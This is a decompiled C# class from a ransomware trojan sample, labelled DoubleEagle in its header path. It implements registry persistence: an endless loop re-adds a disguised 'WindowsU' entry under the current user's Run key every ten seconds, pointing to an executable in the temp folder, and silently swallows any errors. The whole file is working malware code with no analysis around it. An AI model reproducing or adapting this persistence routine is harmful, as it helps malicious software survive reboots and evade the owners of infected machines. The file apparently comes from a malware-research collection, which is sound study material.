// Decompiled with JetBrains decompiler
// Type: datav.RegPersistence
// Assembly: datav, Version=1.2.3.1, Culture=neutral, PublicKeyToken=null
// MVID: 62ACF508-799B-4A60-859B-EB406379EBBF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.DoubleEagle.gw-a758debd627be0a7841059f2c3c176ba1d8878874b8aefc9ab3bcc6532f2fdfb.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.IO;
using System.Threading;

namespace datav
{
  [StandardModule]
  internal sealed class RegPersistence
  {
    private static string MyPath = Path.GetTempPath() + "WindowsU.exe";
    private static string MyValue = "WindowsU";

    public static void Persistence()
    {
      while (true)
      {
        if (!RegPersistence.CheckKey())
          RegPersistence.AddKey();
        Thread.Sleep(10000);
      }
    }

    private static bool CheckKey()
    {
      string str1 = (string) null;
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      string[] valueNames = registryKey.GetValueNames();
      registryKey.Close();
      string[] strArray = valueNames;
      int index = 0;
      while (index < strArray.Length)
      {
        string str2 = strArray[index];
        str1 = str1 + str2 + "|";
        checked { ++index; }
      }
      return str1.Contains(RegPersistence.MyValue);
    }

    private static void AddKey()
    {
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey.SetValue(RegPersistence.MyValue, (object) RegPersistence.MyPath);
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
